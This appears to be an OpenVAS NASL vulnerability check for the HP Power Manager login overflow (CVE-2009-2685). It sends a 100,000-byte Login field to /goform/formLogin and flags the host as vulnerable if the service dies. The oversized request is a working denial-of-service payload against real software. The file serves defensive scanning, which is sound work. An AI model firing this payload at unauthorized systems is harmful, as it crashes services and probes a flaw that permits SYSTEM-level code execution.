###############################################################################
# OpenVAS Vulnerability Test
# $Id: hp_power_manager_36933.nasl 13210 2019-01-22 09:14:04Z cfischer $
#
# HP Power Manager Management Web Server Login Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:power_manager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100346");
  script_version("$Revision: 13210 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-22 10:14:04 +0100 (Tue, 22 Jan 2019) $");
  script_tag(name:"creation_date", value:"2009-11-13 18:49:45 +0100 (Fri, 13 Nov 2009)");
  script_bugtraq_id(36933);
  script_cve_id("CVE-2009-2685");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("HP Power Manager Management Web Server Login Remote Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36933");
  script_xref(name:"URL", value:"http://h18000.www1.hp.com/products/servers/proliantstorage/power-protection/software/power-manager/index.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/507697");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/507708");
  script_xref(name:"URL", value:"http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01905743");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-09-081/");

  script_category(ACT_DENIAL);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("hp_power_manager_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("hp_power_manager/detected");

  script_tag(name:"solution", value:"The vendor has released updates and an advisory. Please see the references
  for details.");

  script_tag(name:"summary", value:"HP Power Manager is prone to a remote code-execution vulnerability because it
  fails to properly bounds-check user-supplied data.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code with SYSTEM
  credentials, resulting in a complete compromise of the affected computer. Failed exploit attempts will result in a
  denial-of-service condition.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

variables = "HtmlOnly=true&Login=" + crap(length:100000) + "&Password=bla&loginButton=Submit%20Login";
host      = http_host_name( port:port );
filename  = dir + "/goform/formLogin";

req = string( "POST ", filename, " HTTP/1.0\r\n",
              "Referer: ","http://", host, filename, "\r\n",
              "Host: ", host, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(variables),
              "\r\n\r\n",
              variables
            );
http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

sleep(2);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);